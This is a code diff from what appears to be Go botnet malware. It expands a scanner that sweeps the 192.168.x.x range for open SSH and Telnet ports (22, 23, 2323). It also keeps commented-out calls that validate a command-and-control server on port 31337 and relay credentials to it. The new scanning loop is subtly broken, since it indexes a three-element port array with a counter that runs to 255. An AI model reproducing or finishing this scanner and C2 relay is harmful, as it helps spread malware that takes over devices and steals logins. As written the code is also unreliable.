@@ -281,33 +281,70 @@ func c2crd(usr string, psw string, ip string, port string) {
 	}
 }
 
-func generateIP(index int) string {
-	return fmt.Sprintf("192.168.1.%d", index)
+func generateIP(index1 int,index0 int) string {
+	return fmt.Sprintf("192.168.%d.%d", index1, index0)
 }
 
-func Scanner(choose int) {
-	if choose == 1 {
-		for i := 1; i <= 255; i++ {
-			go isSSHOpen(generateIP(i))
-		}
-		for i := 1; i <= 255; i++ {
-			go isTelnetOpen(generateIP(i),"23")
-		}
-	} else {
-		fmt.Println("Try to scan Telnet ---------------")
-		isTelnetOpen("192.168.1.167","23")
-		fmt.Println("Try to scan SSH ---------------")
-		isSSHOpen("192.168.1.167")
+func checkPort(ip string, port int) bool {
+	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", ip, port))
+	if err != nil {
+		return false
 	}
+	conn.Close()
+	return true
 }
 
+func Scanner() {
+	port:=[3]int{22,23,2323}
+	for i := 1; i <= 255; i++ {
+		for j := 1; j <= 255; j++ {
+			ip := generateIP(i,j)
+			for k:=0 ; k<len(port) ; k++{
+				checkPort(ip,port[j])
+				if port[j]==23 || port[j]==2323{
+					isTelnetOpen(ip,intToString(port[j]))
+				}else{
+					isSSHOpen(ip)
+				}
+			}
+		}
+	}
+	
+ 
+}
+func intToString(num int) string {
+	// Handle the special case of 0 separately
+	if num == 0 {
+		return "0"
+	}
+
+	// Determine the sign of the number
+	sign := ""
+	if num < 0 {
+		sign = "-"
+		num = -num
+	}
+
+	// Convert each digit to its corresponding ASCII character
+	var digits []byte
+	for num > 0 {
+		digit := '0' + byte(num%10)
+		digits = append([]byte{digit}, digits...)
+		num /= 10
+	}
+
+	return sign + string(digits)
+}
 
 func main() {
 	fmt.Println("[Scanner] Scanner process started ..")
 	//isSSHOpen("192.168.1.163")
 	isTelnetOpen("192.168.1.181","23")
+	//Scanner()
+
 	//if validateC2("192.168.1.97","31337"){
 	//	c2crd("test","test","192.168.1.97","31337")
 	//} //test connect relay
 	time.Sleep(20*time.Second)
 }
+
